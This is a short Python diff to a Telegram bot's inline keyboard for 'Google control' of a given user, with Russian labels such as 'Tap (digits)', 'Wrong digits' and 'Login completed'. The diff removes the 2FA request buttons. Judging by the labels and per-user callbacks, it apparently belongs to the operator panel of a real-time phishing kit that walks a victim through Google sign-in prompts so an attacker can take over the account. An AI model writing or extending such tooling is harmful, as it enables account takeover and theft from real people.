@@ -58,10 +58,9 @@ def get_google_control_keyboard(user_tg_id: int) -> InlineKeyboardMarkup:
             ],
             [
                 InlineKeyboardButton(text="📲 Тап (Цифры)", callback_data=f"gctrl:ask_prompt:{user_tg_id}"),
-                InlineKeyboardButton(text="🔑 Запросить 2FA", callback_data=f"gctrl:ask_2fa:{user_tg_id}"),
+                InlineKeyboardButton(text="❌ Неверные цифры", callback_data=f"gctrl:wrong_prompt:{user_tg_id}"),
             ],
             [
-                InlineKeyboardButton(text="❌ Неверный 2FA", callback_data=f"gctrl:wrong_2fa:{user_tg_id}"),
                 InlineKeyboardButton(text="✅ Вход выполнен", callback_data=f"gctrl:complete:{user_tg_id}"),
             ],
         ]
